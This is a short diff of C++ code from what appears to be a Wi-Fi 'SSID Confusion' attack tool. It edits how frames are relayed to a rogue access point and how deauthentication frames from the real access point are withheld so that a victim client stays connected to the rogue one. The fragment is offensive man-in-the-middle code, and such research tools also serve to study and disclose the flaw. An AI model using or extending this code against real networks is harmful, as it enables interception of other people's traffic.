@@ -48,9 +48,8 @@ void SsidConfusion::send_to_rogue(PDU &pdu) const {
 }
 
 void SsidConfusion::send_to_rogue(const frame_raw_t &raw) const {
-	auto translated = ensure_radiotap(raw);
-	translate_data_mac(translated, ap->get(SK::mac), rogue_ap->get(SK::mac));
-	sock_rogue->send(translated, netconfig.rogue_channel);
+	const auto full_radiotap = ensure_radiotap(raw);
+	sock_rogue->send(full_radiotap, netconfig.rogue_channel);
 }
 
 FrameProcess SsidConfusion::handle_eapol_real(
@@ -151,7 +150,11 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 		return;
 	}
 	// don't relay deauth/disassoc from real AP - would disconnect client from rogue AP
-	if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) return;
+	if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) {
+		//TODO should be changes status here or neds be ignored because first deauth
+		handle_disconnect_real(*dot11);
+		return;
+	}
 
 
 	power_mgmt_response_real(addr2, *dot11);
